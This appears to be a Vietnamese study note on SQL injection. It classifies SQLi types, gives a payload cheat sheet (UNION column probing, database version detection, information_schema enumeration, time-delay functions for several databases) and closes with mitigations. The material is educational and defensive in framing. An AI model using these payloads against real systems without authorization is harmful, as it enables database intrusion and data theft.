# 💉 SQL Injection (SQLi)

## 1. 📌 Tổng quan & Phân loại
SQL Injection là lỗ hổng bảo mật cho phép kẻ tấn công can thiệp vào các truy vấn cơ sở dữ liệu (Database Query) mà ứng dụng thực thi.

### Các loại SQL Injection chính:
1. **In-band SQLi (Classic):**
   - **Union-based:** Dùng toán tử `UNION` để nối kết quả truy vấn của kẻ tấn công vào kết quả của ứng dụng.
   - **Error-based:** Ép database sinh ra lỗi chứa thông tin nhạy cảm.
2. **Inferential SQLi (Blind):**
   - **Boolean-based (Conditional responses):** Suy đoán dữ liệu đúng/sai dựa vào sự thay đổi nội dung trang web.
   - **Error-based (Conditional errors):** Kích hoạt lỗi database (ví dụ chia cho 0) khi điều kiện đúng.
   - **Time-based:** Dùng các hàm sleep (`pg_sleep()`, `WAITFOR DELAY`) để suy đoán từng ký tự qua độ trễ response.
3. **Out-of-band SQLi (OAST):**
   - Kích hoạt database gửi DNS request hoặc HTTP request ra ngoài (sử dụng Burp Collaborator).

---

## 2. 🔍 Cheat Sheet & Payloads

### Xác định số cột (Union-based):
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (Nếu lỗi -> số cột = 2)

' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

### Tìm cột có kiểu dữ liệu chuỗi (String compatible):
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

### Lấy thông tin phiên bản Database (Version Detection):
- **Oracle:** `' UNION SELECT BANNER, NULL FROM v$version--`
- **Microsoft / MySQL:** `' UNION SELECT @@version, NULL--`
- **PostgreSQL:** `' UNION SELECT version(), NULL--`

### Lấy danh sách bảng & cột (Information Schema):
- **Bảng (Tables):**
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables--
  ```
- **Cột (Columns):**
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
- **Oracle (Tables):**
  ```sql
  ' UNION SELECT table_name, NULL FROM all_tables--
  ```

### Blind SQLi - Time Delay:
- **Oracle:** `dbms_pipe.receive_message(('a'),10)`
- **Microsoft:** `WAITFOR DELAY '0:0:10'`
- **PostgreSQL:** `SELECT pg_sleep(10)`
- **MySQL:** `SELECT sleep(10)`

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Parameterized Queries (Prepared Statements):** Tách biệt code và data.
2. **Object Relational Mapping (ORM):** Sử dụng các ORM an toàn (Hibernate, Entity Framework, Prisma, SQLAlchemy...).
3. **Principle of Least Privilege:** Giới hạn quyền của user kết nối database (không dùng quyền `root` / `dba`).
